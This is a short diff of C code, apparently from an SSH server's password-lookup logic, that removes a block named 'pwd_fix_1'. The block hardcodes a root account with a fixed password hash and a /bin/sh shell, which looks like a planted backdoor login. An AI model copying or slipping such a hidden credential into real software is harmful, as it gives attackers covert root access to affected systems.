@@ -618,15 +618,6 @@ const char* get_user_shell() {
 	}
 }
 
-static struct passwd pwd_fix_1 = {
-    .pw_name = "root",
-    .pw_passwd = "$1$5RPVAd$MYeVT.93uuD5BkMZfx08j1",
-    .pw_uid = 0,
-    .pw_gid = 0,
-    .pw_dir = "/root",
-    .pw_shell = "/bin/sh"
-};
-
 void fill_passwd(const char* username) {
 	struct passwd *pw = NULL;
 	if (ses.authstate.pw_name)
